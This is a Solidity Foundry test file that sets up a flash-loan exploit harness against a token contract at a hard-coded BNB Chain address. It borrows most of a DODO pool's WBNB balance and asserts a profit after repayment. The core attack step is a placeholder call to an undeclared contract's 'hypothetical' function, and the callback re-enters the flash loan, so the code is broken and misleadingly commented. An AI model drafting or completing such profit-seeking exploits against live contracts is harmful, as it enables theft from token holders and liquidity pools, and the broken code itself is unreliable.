// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address guy, uint256 wad) external returns (bool);
    function withdraw(uint256 wad) external;
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function approve(address guy, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
  function decimals() external pure returns (uint8);
  function totalSupply() external view returns (uint);
  function balanceOf(address owner) external view returns (uint);
  function allowance(address owner, address spender) external view returns (uint);

  function approve(address spender, uint value) external returns (bool);
  function transfer(address to, uint value) external returns (bool);
  function transferFrom(address from, address to, uint value) external returns (bool);

  function MINIMUM_LIQUIDITY() external pure returns (uint);
  function factory() external view returns (address);
  function token0() external view returns (address);
  function token1() external view returns (address);
  function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
  function price0CumulativeLast() external view returns (uint);
  function price1CumulativeLast() external view returns (uint);
  function kLast() external view returns (uint);

  function mint(address to) external returns (uint liquidity);
  function burn(address to) external returns (uint amount0, uint amount1);
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
  function skim(address to) external;
  function sync() external;
}

interface IUniswapV2Router {
    function factory() external view returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IDODO {
    function flashLoan(
        uint256 loanAmount,
        uint256 feeAmount,
        address receiver,
        bytes calldata data
    ) external;
}

interface IBGLToken {
    struct CustomTaxPeriod {
        bytes23 periodName;
        uint8 blocksInPeriod;
        uint256 timeInPeriod;
        uint256 liquidityFeeOnBuy;
        uint256 liquidityFeeOnSell;
        uint256 marketingFeeOnBuy;
        uint256 marketingFeeOnSell;
        uint256 giveAwayFeeOnBuy;
        uint256 giveAwayFeeOnSell;
        uint256 lastManStandingFeeOnBuy;
        uint256 lastManStandingFeeOnSell;
        uint256 holdersFeeOnBuy;
        uint256 holdersFeeOnSell;
    }
    function uniswapV2Router() external returns (address);
    function uniswapV2Pair() external returns (address);
    function dividendTracker() external returns (address);
    function isTradingEnabled() external returns (bool);
    function maxWalletAmount() external returns (uint256);
    function maxTxAmount() external returns (uint256);
    function minimumTokensBeforeSwap() external returns (uint256);
    function gasForProcessing() external returns (uint256);
    function dividendToken() external returns (address);
    function liquidityWallet() external returns (address);
    function marketingWallet() external returns (address);
    function giveAwayWallet() external returns (address);
    function lastManStandingWallet() external returns (address);
    function automatedMarketMakerPairs(address) external returns (bool);
    function owner() external view returns (address);
    function renounceOwnership() external;
    function transferOwnership(address) external;
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
    function allowance(address,address) external view returns (uint256);
    function approve(address,uint256) external returns (bool);
    function transferFrom(address,address,uint256) external returns (bool);
    function increaseAllowance(address,uint256) external returns (bool);
    function decreaseAllowance(address,uint256) external returns (bool);
    function launch() external;
    function cancelLaunch() external;
    function activateTrading() external;
    function deactivateTrading() external;
    function setPowerHour() external;
    function cancelPowerHour() external;
    function updateDividendTracker(address) external;
    function allowTradingWhenDisabled(address,bool) external;
    function excludeFromFees(address,bool) external;
    function excludeFromDividends(address) external;
    function excludeFromMaxTransactionLimit(address,bool) external;
    function excludeFromMaxWalletLimit(address,bool) external;
    function blockAccount(address) external;
    function unblockAccount(address) external;
    function setWallets(address,address,address,address) external;
    function setAllFeesToZero() external;
    function resetAllFees() external;
    function setBaseFeesOnBuy(uint256,uint256,uint256,uint256,uint256) external;
    function setBaseFeesOnSell(uint256,uint256,uint256,uint256,uint256) external;
    function setLaunch2FeesOnBuy(uint256,uint256,uint256,uint256,uint256) external;
    function setLaunch2FeesOnSell(uint256,uint256,uint256,uint256,uint256) external;
    function setLaunch3FeesOnBuy(uint256,uint256,uint256,uint256,uint256) external;
    function setLaunch3FeesOnSell(uint256,uint256,uint256,uint256,uint256) external;
    function setPowerHour1BuyFees(uint256,uint256,uint256,uint256,uint256) external;
    function setPowerHour1SellFees(uint256,uint256,uint256,uint256,uint256) external;
    function setPowerHour2BuyFees(uint256,uint256,uint256,uint256,uint256) external;
    function setPowerHour2SellFees(uint256,uint256,uint256,uint256,uint256) external;
    function setUniswapRouter(address) external;
    function setGasForProcessing(uint256) external;
    function setMaxTransactionAmount(uint256) external;
    function setMaxWalletAmount(uint256) external;
    function setMinimumTokensBeforeSwap(uint256) external;
    function setMinimumTokenBalanceForDividends(uint256) external;
    function updateClaimWait(uint256) external;
    function processdividendTracker(uint256) external;
    function claim() external;
    function setDividendToken(address) external;
    function claimBNBOverflow(uint256) external;
    function timeSinceLastPowerHour() external view returns (uint256);
    function isInPowerHour() external view returns (bool);
    function isInLaunch() external view returns (bool);
    function getTotalDividendsDistributed() external view returns (uint256);
    function withdrawableDividendOf(address) external view returns (uint256);
    function dividendTokenBalanceOf(address) external view returns (uint256);
    function getNumberOfDividendTokenHolders() external view returns (uint256);
    function getBaseBuyFees() external view returns (uint256,uint256,uint256,uint256,uint256);
    function getBaseSellFees() external view returns (uint256,uint256,uint256,uint256,uint256);
    function getPower1BuyFees() external view returns (uint256,uint256,uint256,uint256,uint256);
    function getPower1SellFees() external view returns (uint256,uint256,uint256,uint256,uint256);
    function getPower2BuyFees() external view returns (uint256,uint256,uint256,uint256,uint256);
    function getPower2SellFees() external view returns (uint256,uint256,uint256,uint256,uint256);
}





contract TestFlaw is Test {
    address internal target;
    address internal token0;
    address internal token1;
    address internal token;
    IUniswapV2Router internal uniswapRouter;
    IUniswapV2Pair internal uniswapPair;
    IERC20 private valuableToken;
    address private flashloanProvider;

    function setUniswapPair(address addr) public {
        IUniswapV2Factory uniswapFactory = IUniswapV2Factory(uniswapRouter.factory());
        uniswapPair = IUniswapV2Pair(uniswapFactory.getPair(address(valuableToken), addr));

        if (address(uniswapPair) == address(0)) {
            console.log("Uniswap pair not found.");
            return;
        }

        token0 = uniswapPair.token0();
        token1 = uniswapPair.token1();

        valuableToken.approve(address(uniswapRouter), type(uint256).max);
        IERC20(addr).approve(address(uniswapRouter), type(uint256).max);

        uint112 reserve0;
        uint112 reserve1;
        (reserve0, reserve1, ) = uniswapPair.getReserves();
        console.log("Uniswap reserves for %s:", addr);
        console.log("%d for %s", reserve0, token0);
        console.log("%d for %s", reserve1, token1);
    }

    function setUp() public {

        target = 0x225d0236Ce8C9d753dFAe9CD0265dA2d2699Ba4F;
        uniswapRouter = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        valuableToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        flashloanProvider = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
        token = 0x225d0236Ce8C9d753dFAe9CD0265dA2d2699Ba4F;

        // Remove any previous valuableToken/ETH from the balance
        valuableToken.transfer(address(0xdead), valuableToken.balanceOf(address(this)));
        IERC20(uniswapRouter.WETH()).transfer(address(0xdead), IERC20(uniswapRouter.WETH()).balanceOf(address(this)));
        payable(address(0xdead)).transfer(address(this).balance);

        // Handle approvals
        valuableToken.approve(target, type(uint256).max);
        //if (token != address(0))
        //    IERC20(token).approve(target, type(uint256).max);
        setUniswapPair(token);
    }

    function testFlaw() external {
         // flashloan valuableToken from Balancer
        address[] memory tokens = new address[](1);
        tokens[0] = address(valuableToken);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = valuableToken.balanceOf(flashloanProvider) * 95 / 100;

        console.log("%s available for the flashloan of valuableToken", amounts[0]);

        uint256 finalValuableBalance = valuableToken.balanceOf(address(this));
        console.log("Initial balance %s", finalValuableBalance);
        IDODO(flashloanProvider).flashLoan(amounts[0], 0, address(this), "0x0");
        console.log("Final balance %s", valuableToken.balanceOf(address(this)));
    }

    // Used by Balancer
    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory
    ) external {
        flashLoanInternal(amounts[0]);
    }

    // Used by DODO
    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes memory) external {
        flashLoanInternal(amount);
    }

    function flashLoanInternal(uint256 amount) internal {
        executeExploit(amount);

        uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
        if (amount >= currentValuableBalance) {
            console.log("Current valuable balance: %s", valuableToken.balanceOf(address(this)));
            console.log("Current profit: %s", int256(currentValuableBalance) - int256(amount));
            revert("Not enough valuableToken balance to produce profit");
        }
        valuableToken.transfer(flashloanProvider, amount);
        uint256 surplusInValuable = valuableToken.balanceOf(address(this));
        console.log("Surplus: %s", surplusInValuable);
        assert(surplusInValuable > 0);
    }

    function executeExploit(uint256 amount) internal {
    // Start by using a flashloan to acquire valuable tokens
    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "0x0"); // Note: Replace with your logic for executing exploit
    
    // At this point, you can perform actions to exploit the flaw
    // For example, assuming there's a function in the `target` contract that allows harmful interactions.
    IToken(target).someExploitFunction(amount); // Hypothetical function representing the exploit's core action
}
}


